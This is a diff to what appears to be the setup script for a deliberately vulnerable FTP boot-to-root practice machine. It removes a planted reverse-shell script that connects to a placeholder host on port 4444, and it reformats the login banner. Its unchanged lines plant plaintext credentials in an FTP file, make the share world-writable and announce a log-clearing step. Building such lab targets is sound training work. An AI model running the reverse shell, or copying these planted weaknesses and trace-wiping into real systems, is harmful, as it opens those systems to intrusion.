@@ -45,12 +45,6 @@ EOF
 mkdir -p /srv/ftp/files
 echo "credentials: oramiuser:123456" > /srv/ftp/files/leeme.txt
 
-cat > /srv/ftp/files/shell.sh << 'SHELLEOF'
-#!/bin/bash
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-SHELLEOF
-chmod +x /srv/ftp/files/shell.sh
-
 chmod 755 /srv/ftp
 chmod 777 /srv/ftp/files
 
@@ -89,11 +83,10 @@ cat > /etc/motd << 'EOF'
 EOF
 
 cat > /etc/issue.net << 'EOF'
-+---------------------------------------------+
-|       FTP-Vuln - Boot to Root Challenge     |
-|       Dificultad: Facil                      |
-+---------------------------------------------+
-
++-----------------------------------------------+
+|       FTP-Vuln - Boot to Root Challenge        |
+|       Dificultad: Facil                        |
++-----------------------------------------------+
 EOF
 
 echo "[8/8] Limpiando logs y rastros..."
